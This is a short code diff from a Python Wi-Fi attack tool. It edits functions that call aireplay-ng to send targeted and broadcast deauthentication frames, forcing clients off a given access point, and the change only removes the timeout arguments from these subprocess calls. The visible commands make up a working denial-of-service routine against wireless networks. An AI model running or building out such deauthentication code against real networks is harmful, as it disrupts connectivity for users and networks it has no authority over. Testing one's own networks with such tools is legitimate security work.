@@ -423,7 +423,6 @@ def send_targeted_deauth(
         ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac,
          monitor_interface],
         capture_output=True,
-        timeout=count * 2 + 8,
     )
 
     time.sleep(0.15)
@@ -438,7 +437,6 @@ def send_targeted_deauth(
         ["aireplay-ng", "-0", str(count), "-a", client_mac, "-c", bssid,
          monitor_interface],
         capture_output=True,
-        timeout=count * 2 + 8,
     )
 
     logger.info(
@@ -464,7 +462,6 @@ def send_broadcast_deauth_fallback(
     subprocess.run(
         ["aireplay-ng", "-0", str(count), "-a", bssid, monitor_interface],
         capture_output=True,
-        timeout=count * 2 + 10,
     )
     logger.info("Broadcast deauth fallback: bssid=%s count=%d", bssid, count)
 
